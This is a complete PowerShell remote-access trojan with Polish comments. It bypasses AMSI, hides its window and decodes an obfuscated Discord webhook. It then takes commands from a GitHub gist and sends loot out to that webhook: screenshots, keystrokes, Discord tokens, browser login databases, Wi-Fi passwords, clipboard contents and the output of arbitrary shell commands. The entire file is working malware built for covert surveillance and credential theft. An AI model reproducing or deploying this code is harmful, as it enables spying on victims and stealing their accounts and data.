

# AMSI Bypass
try{[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)}catch{}

# Hide console
try{
    Add-Type -Name W -Namespace W -MemberDefinition '[DllImport("kernel32.dll")]public static extern IntPtr GetConsoleWindow();[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr h,int n);'
    [W.W]::ShowWindow([W.W]::GetConsoleWindow(),0) | Out-Null
}catch{}

Write-Host "Done"
Write-Host "Done"
Write-Host "Done"

# === DEKODOWANIE WEBHOOKA (XOR) ===
function XOR($d,$k){$r='';for($i=0;$i-lt$d.Length;$i++){$r+=[char]($d[$i]-bxor$k[$i%$k.Length])};return $r}
$q3=@(35,14,104,79,251,152,114,190,74,15,199,110,28,187,35,203,121,224,88,253,13,116,209,118,233,66,25,155,47,195,125,173,100,75,41,14,185,147,108,162,24,85,131,62,70,249,116,209,44,182,7,230,67,109,203,45,204,80,74,176,8,203,59,166,14,59,86,76,195,240,53,208,88,32,250,59,10,166,43,173,85,203,68,179,46,67,212,13,168,77,24,189,39,159,96,156,32,0,37,15,206,229,105,242,124,50,226,102,69,155,36,141,105,219,6,131,30,92,212,1,218)
$q4=@(75,122,28,63,136,162,93,145,46,102,180,13,115,201,71,229,26,143,53,210,108,4,184,89,158,39,123,243,64,172,22,222)
$hook = XOR $q3 $q4
# === KONIEC DEKODOWANIA ===

# === KONFIGURACJA ===
$cmdUrl = "https://gist.githubusercontent.com/MeowTonenohh/60d56901ae64efb615f6e27cd9739d7d/raw/4d3e55a18dd67ec84f829f387d111fd3adf390a9/gistfile1.txt"  # 🔁 ZMIEŃ NA SWÓJ GIST RAW URL
$targetName = "$env:COMPUTERNAME-$env:USERNAME"
$loopInterval = 5  # sekund
# === KONIEC KONFIGURACJI ===

function Send-Discord($msg) {
    try {
        $b = "----$(Get-Random)"
        $body = "--$b`r`nContent-Type: application/json`r`n`r`n{`"content`":`"$($msg -replace '"','\"')`"}`r`n--$b--"
        $r = [System.Net.WebRequest]::Create($hook)
        $r.Method = "POST"
        $r.ContentType = "multipart/form-data; boundary=$b"
        $bytes = [Text.Encoding]::UTF8.GetBytes($body)
        $r.ContentLength = $bytes.Length
        $r.Timeout = 10000
        $s = $r.GetRequestStream()
        $s.Write($bytes,0,$bytes.Length)
        $s.Dispose()
        $r.GetResponse().Close()
    } catch {}
}

function Send-File($fileName, $fileBytes) {
    try {
        $b = "----$(Get-Random)"
        $bodyStream = [System.IO.MemoryStream]::new()
        $writer = [System.IO.StreamWriter]::new($bodyStream)
        $writer.Write("--$b`r`nContent-Disposition: form-data; name=`"payload_json`"`r`nContent-Type: application/json`r`n`r`n{`"content`":`"File from $targetName`"}`r`n")
        $writer.Write("--$b`r`nContent-Disposition: form-data; name=`"files[0]`"; filename=`"$fileName`"`r`nContent-Type: application/octet-stream`r`n`r`n")
        $writer.Flush()
        $bodyStream.Write($fileBytes, 0, $fileBytes.Length)
        $writer.Write("`r`n--$b--`r`n")
        $writer.Flush()
        $bytes = $bodyStream.ToArray()
        $writer.Dispose()
        $bodyStream.Dispose()
        $r = [System.Net.WebRequest]::Create($hook)
        $r.Method = "POST"
        $r.ContentType = "multipart/form-data; boundary=$b"
        $r.ContentLength = $bytes.Length
        $r.Timeout = 30000
        $s = $r.GetRequestStream()
        $s.Write($bytes,0,$bytes.Length)
        $s.Dispose()
        $r.GetResponse().Close()
    } catch {}
}

# Beacon
Send-Discord "✅ **$targetName** - Agent online"

# Główna pętla
$lastCmd = ""
while ($true) {
    try {
        $cmd = (Invoke-WebRequest -Uri $cmdUrl -UseBasicParsing -TimeoutSec 10).Content.Trim()

        if ($cmd -ne $lastCmd -and $cmd -ne "") {
            $lastCmd = $cmd
            Send-Discord "⚡ **$targetName** executing: `"$cmd`""

            if ($cmd -eq "SCREENSHOT") {
                try {
                    Add-Type -AssemblyName System.Drawing
                    Add-Type -AssemblyName System.Windows.Forms
                    $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                    $bmp = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
                    $g = [System.Drawing.Graphics]::FromImage($bmp)
                    $g.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
                    $g.Dispose()
                    $path = "$env:TEMP\ss_$(Get-Random).png"
                    $bmp.Save($path, [System.Drawing.Imaging.ImageFormat]::Png)
                    $bmp.Dispose()
                    $fileBytes = [System.IO.File]::ReadAllBytes($path)
                    Send-File -fileName "screenshot_$targetName.png" -fileBytes $fileBytes
                    Remove-Item $path -Force -ErrorAction SilentlyContinue
                } catch { Send-Discord "❌ **$targetName** Screenshot failed: $_" }
            }
            elseif ($cmd -eq "SYSINFO") {
                try {
                    $info = @()
                    $info += "**===== $targetName =====**"
                    $info += "OS: $((Get-WmiObject Win32_OperatingSystem -ErrorAction Stop).Caption)"
                    $info += "CPU: $((Get-WmiObject Win32_Processor -ErrorAction Stop).Name)"
                    $info += "RAM: $([math]::Round((Get-WmiObject Win32_ComputerSystem -ErrorAction Stop).TotalPhysicalMemory/1GB,2)) GB"
                    $info += "GPU: $(((Get-WmiObject Win32_VideoController -ErrorAction Stop).Name) -join '; ')"
                    $info += "IP: $(Invoke-RestMethod -Uri 'https://api.ipify.org' -UseBasicParsing -ErrorAction SilentlyContinue)"
                    $info += "User: $env:USERNAME@$env:COMPUTERNAME"
                    Send-Discord ($info -join "`n")
                } catch { Send-Discord "❌ **$targetName** SysInfo failed: $_" }
            }
            elseif ($cmd -eq "KEYLOG") {
                try {
                    $log = ""
                    $end = (Get-Date).AddSeconds(30)
                    while ((Get-Date) -lt $end) {
                        if ([Console]::KeyAvailable) {
                            $key = [Console]::ReadKey($true)
                            if ($key.Key -eq "Enter") { $log += "[ENTER]`n" }
                            elseif ($key.Key -eq "Backspace") { $log += "[BS]" }
                            elseif ($key.Key -eq "Space") { $log += " " }
                            elseif ($key.Key -eq "Tab") { $log += "[TAB]" }
                            elseif ($key.Key -eq "Escape") { $log += "[ESC]" }
                            elseif ($key.KeyChar -ne 0) { $log += $key.KeyChar }
                        }
                        Start-Sleep -Milliseconds 50
                    }
                    if ($log.Length -gt 0) {
                        $bytes = [Text.Encoding]::UTF8.GetBytes("=== Keylog from $targetName ===`n$log")
                        Send-File -fileName "keylog_$targetName.txt" -fileBytes $bytes
                    } else {
                        Send-Discord "📝 **$targetName** No keys captured in 30s"
                    }
                } catch { Send-Discord "❌ **$targetName** Keylog failed: $_" }
            }
            elseif ($cmd -eq "TOKENS") {
                try {
                    $tokenRegex = [regex]::new('[a-zA-Z0-9_-]{24,26}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27,38}')
                    $paths = @("$env:APPDATA\discord","$env:APPDATA\discordcanary","$env:APPDATA\discordptb","$env:LOCALAPPDATA\discord","$env:LOCALAPPDATA\discordcanary","$env:LOCALAPPDATA\discordptb")
                    $tokens = @()
                    foreach ($base in $paths) {
                        $ldb = "$base\Local Storage\leveldb"
                        if (Test-Path $ldb) {
                            foreach ($f in (Get-ChildItem "$ldb\*" -Include "*.ldb","*.log" -ErrorAction SilentlyContinue)) {
                                $c = [System.IO.File]::ReadAllText($f.FullName)
                                foreach ($m in $tokenRegex.Matches($c)) {
                                    if ($m.Value -notmatch "sentry|undefined|null|mfa\.") { $tokens += $m.Value }
                                }
                            }
                        }
                    }
                    $unique = $tokens | Select-Object -Unique
                    if ($unique.Count -gt 0) {
                        $txt = "=== Discord Tokens from $targetName ===`n" + ($unique -join "`n")
                        $bytes = [Text.Encoding]::UTF8.GetBytes($txt)
                        Send-File -fileName "tokens_$targetName.txt" -fileBytes $bytes
                    } else {
                        Send-Discord "🔑 **$targetName** No Discord tokens found"
                    }
                } catch { Send-Discord "❌ **$targetName** Token grab failed: $_" }
            }
            elseif ($cmd -eq "PASSWORDS") {
                try {
                    $browsers = @("$env:LOCALAPPDATA\Google\Chrome\User Data","$env:LOCALAPPDATA\Microsoft\Edge\User Data","$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data","$env:APPDATA\Opera Software\Opera Stable")
                    $found = @()
                    foreach ($b in $browsers) {
                        $profiles = Get-ChildItem "$b\*" -Directory -ErrorAction SilentlyContinue | Where-Object { $_.Name -match "^(Default|Profile \d+)$" }
                        foreach ($p in $profiles) {
                            $loginFile = "$($p.FullName)\Login Data"
                            if (Test-Path $loginFile) {
                                $tmp = "$env:TEMP\ld_$(Get-Random)"
                                Copy-Item $loginFile $tmp -Force
                                $found += "[$b\$($p.Name)] Login Data file ($((Get-Item $tmp).Length) bytes)"
                            }
                        }
                    }
                    if ($found.Count -gt 0) {
                        $txt = "=== Browser passwords from $targetName ===`n" + ($found -join "`n") + "`n`nFiles saved locally. To decrypt: copy Login Data files and use ChromePass."
                        $bytes = [Text.Encoding]::UTF8.GetBytes($txt)
                        Send-File -fileName "passwords_$targetName.txt" -fileBytes $bytes
                    } else {
                        Send-Discord "🔑 **$targetName** No browser password files found"
                    }
                } catch { Send-Discord "❌ **$targetName** Password grab failed: $_" }
            }
            elseif ($cmd -eq "CLIPBOARD") {
                try {
                    $clip = Get-Clipboard -ErrorAction Stop
                    if ($clip) {
                        $txt = "=== Clipboard from $targetName ===`n$clip"
                        $bytes = [Text.Encoding]::UTF8.GetBytes($txt)
                        Send-File -fileName "clipboard_$targetName.txt" -fileBytes $bytes
                    } else {
                        Send-Discord "📋 **$targetName** Clipboard is empty"
                    }
                } catch { Send-Discord "❌ **$targetName** Clipboard failed: $_" }
            }
            elseif ($cmd -eq "PROCESSES") {
                try {
                    $procs = Get-Process | Sort-Object CPU -Descending | Select-Object -First 20 | Format-Table Name, Id, @{N='CPU(s)';E={[math]::Round($_.CPU,1)}}, WorkingSet64 -AutoSize | Out-String
                    $txt = "=== Top Processes $targetName ===`n$procs"
                    $bytes = [Text.Encoding]::UTF8.GetBytes($txt)
                    Send-File -fileName "processes_$targetName.txt" -fileBytes $bytes
                } catch { Send-Discord "❌ **$targetName** Processes failed: $_" }
            }
            elseif ($cmd -eq "WIFI") {
                try {
                    $profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { ($_ -split ":")[1].Trim() }
                    $result = @()
                    foreach ($p in $profiles) {
                        $info = netsh wlan show profile name="$p" key=clear | Select-String "Key Content"
                        $pass = if ($info) { ($info -split ":")[1].Trim() } else { "(no password)" }
                        $result += "$p : $pass"
                    }
                    $txt = "=== WiFi Passwords from $targetName ===`n" + ($result -join "`n")
                    $bytes = [Text.Encoding]::UTF8.GetBytes($txt)
                    Send-File -fileName "wifi_$targetName.txt" -fileBytes $bytes
                } catch { Send-Discord "❌ **$targetName** WiFi failed: $_" }
            }
            elseif ($cmd -like "CMD:*") {
                try {
                    $realCmd = $cmd -replace "^CMD:"
                    $result = cmd.exe /c $realCmd 2>&1 | Out-String
                    if ($result.Length -gt 1900) {
                        $bytes = [Text.Encoding]::UTF8.GetBytes($result)
                        Send-File -fileName "cmd_output_$targetName.txt" -fileBytes $bytes
                    } else {
                        Send-Discord "💻 **$targetName** CMD: $realCmd`n```$result```"
                    }
                } catch { Send-Discord "❌ **$targetName** CMD error: $_" }
            }
            elseif ($cmd -like "PS:*") {
                try {
                    $realCmd = $cmd -replace "^PS:"
                    $result = Invoke-Expression $realCmd 2>&1 | Out-String
                    if ($result.Length -gt 1900) {
                        $bytes = [Text.Encoding]::UTF8.GetBytes($result)
                        Send-File -fileName "ps_output_$targetName.txt" -fileBytes $bytes
                    } else {
                        Send-Discord "⚡ **$targetName** PS: $realCmd`n```$result```"
                    }
                } catch { Send-Discord "❌ **$targetName** PS error: $_" }
            }
            elseif ($cmd -like "MSGBOX:*") {
                try {
                    $parts = ($cmd -replace "^MSGBOX:") -split "\|",2
                    Add-Type -AssemblyName System.Windows.Forms
                    [System.Windows.Forms.MessageBox]::Show($parts[0], if($parts.Count -gt 1){$parts[1]}else{"Alert"})
                    Send-Discord "💬 **$targetName** Message box displayed"
                } catch { Send-Discord "❌ **$targetName** MsgBox failed: $_" }
            }
            elseif ($cmd -like "URL:*") {
                try {
                    $url = $cmd -replace "^URL:"
                    Start-Process $url
                    Send-Discord "🌐 **$targetName** Opened URL: $url"
                } catch { Send-Discord "❌ **$targetName** URL failed: $_" }
            }
            elseif ($cmd -like "KILL:*") {
                try {
                    $proc = $cmd -replace "^KILL:"
                    Stop-Process -Name $proc -Force
                    Send-Discord "🔪 **$targetName** Killed process: $proc"
                } catch { Send-Discord "❌ **$targetName** Kill failed: $_" }
            }
            elseif ($cmd -like "POWER:*") {
                $action = $cmd -replace "^POWER:"
                switch ($action) {
                    "lock" { rundll32.exe user32.dll,LockWorkStation; Send-Discord "🔒 **$targetName** Workstation locked" }
                    "restart" { shutdown /r /t 10 /c "Remote C2 restart"; Send-Discord "🔄 **$targetName** Restarting in 10s" }
                    "shutdown" { shutdown /s /t 10 /c "Remote C2 shutdown"; Send-Discord "⏻ **$targetName** Shutting down in 10s" }
                    default { Send-Discord "❌ **$targetName** Unknown power action: $action" }
                }
            }
            elseif ($cmd -eq "EXIT" -or $cmd -eq "STOP") {
                Send-Discord "🛑 **$targetName** Agent stopping"
                exit
            }
            elseif ($cmd -eq "HELP") {
                $help = @"
**===== REMOTE C2 HELP =====**
**SCREENSHOT** - Screenshot
**SYSINFO** - System info
**KEYLOG** - Keylogger 30s
**TOKENS** - Discord tokens
**PASSWORDS** - Browser passwords
**CLIPBOARD** - Clipboard
**PROCESSES** - Process list
**WIFI** - WiFi passwords
**CMD:<cmd>** - Run CMD command
**PS:<cmd>** - Run PowerShell
**MSGBOX:text|title** - Popup message
**URL:https://...** - Open URL
**KILL:name** - Kill process
**POWER:lock/restart/shutdown** - Power options
**EXIT/STOP** - Stop agent
**HELP** - This help
"@
                Send-Discord $help
            }
            else {
                try {
                    $result = Invoke-Expression $cmd 2>&1 | Out-String
                    if ($result.Length -gt 1900) {
                        $bytes = [Text.Encoding]::UTF8.GetBytes($result)
                        Send-File -fileName "output_$targetName.txt" -fileBytes $bytes
                    } else {
                        Send-Discord "⚡ **$targetName** $cmd`n```$result```"
                    }
                } catch { Send-Discord "❌ **$targetName** Error: $_" }
            }
        }
    } catch {}
    Start-Sleep -Seconds $loopInterval
}
